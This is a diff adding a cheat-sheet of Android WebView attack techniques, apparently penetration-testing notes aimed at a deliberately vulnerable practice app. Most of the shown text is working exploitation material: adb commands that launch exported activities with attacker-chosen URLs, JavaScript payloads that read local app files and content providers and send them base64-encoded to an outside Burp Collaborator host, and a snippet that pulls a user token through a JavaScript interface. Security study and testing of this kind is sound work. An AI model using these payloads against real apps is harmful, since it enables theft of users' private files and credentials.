@@ -1,0 +1,84 @@
+# ------------------- start webview attacks ------------------- #
+    # ----- Exported explicit/implicit intent webview attack
+        # -- steps:
+            1. Check the AndroidManifest.xml and the application's acitivities to check WebView code.
+                a. exported="true"
+                b. unsanitize input is passed to WebView methods.
+                    - Input could be taken from the user or intent.
+            2. Intent exploitation:
+                adb shell am start -n <componentname> --es string "domain.com"
+                adb shell am start 0-n <componentname> -s <parametername> "<value>" //OR
+
+                - for example:
+                    adb shell am start -n com.tmh.vulnwebview/.RegistrationWebView --es reg_url "https://kemet.secranix.com"
+
+    # ----- setJavaScriptEnasbled is set to true attack
+        # -- steps:
+            1. Redirect the user to web page contains malicious javascript code. 
+
+        # -- Note:
+            - User redirection could be happened by the intent or user input.
+
+    # ----- setAllowUniversalAccessFromFileURLs is set to true attack
+        # -- steps:
+            1. Redirect the user to webpage contains a malicious code. OR
+            1. Host the webpage within the phone resource and call it by the intent. (Incase the intent is exported)
+        
+        # -- exploitation:
+            <script>
+                var url = 'file:///data/data/com.tmh.vulnwebview/shared_prefs/MainActivity.xml'; //local file
+                function load(url) {
+                        var xhr = new XMLHttpRequest();
+                xhr.onreadystatechange = function() {
+                            if (xhr.readyState === 4) {
+                            fetch('https://8ktm71h4wjnqo72wgqbzvnr7jypodd.burpcollaborator.net/?exfiltrated=' + btoa(xhr.responseText)); //send b64 encoded file to attacker
+                            }
+                        }
+                xhr.open('GET', url, true);
+                        xhr.send('');
+                    }
+                load(url)
+            </script>
+        
+            # -- call the malicious web page through the intent
+                adb shell am start -n com.tmh.vulnwebview/.RegistrationWebView --es reg_url "file://sdcard/downloads/malicious_webpage.html"
+
+    # ----- addJavaScriptInterface is used by the developer attack
+        # -- Discover:
+            1. Analysis the code:
+                - webView.addJavascriptInterface(new WebAppInterface(this), "Android");  
+                - Can take control over the URL that visited by WebView.
+
+        # -- Exploitation:
+            1. malicious web page could contain:
+                <script type="text/javascript">
+                    document.write("token: " + Android.getUserToken());
+                </script>
+
+    # ------ setAllowContentAccess is set to true attack
+        # -- Discover
+            1. Analysis the code.
+                webView.setAllowContentAccess(ON);
+
+        # -- Exploitation:
+            1. malicious web page could contain: 
+                <script>
+                    var url = 'content://<name_of_the_content>'; //local file
+                    function load(url) {
+                            var xhr = new XMLHttpRequest();
+                    xhr.onreadystatechange = function() {
+                                if (xhr.readyState === 4) {
+                                fetch('https://8ktm71h4wjnqo72wgqbzvnr7jypodd.burpcollaborator.net/?exfiltrated=' + btoa(xhr.responseText)); //send b64 encoded file to attacker
+                                }
+                            }
+                    xhr.open('GET', url, true);
+                            xhr.send('');
+                        }
+                    load(url)
+                </script>
+# -------------------   end webview attacks ------------------- #
+
+# ------------------- start Mitigations ------------------- #
+    - Check the mitigation: "./01-introduction/012-webview"
+# -------------------   end Mitigations ------------------- #
+
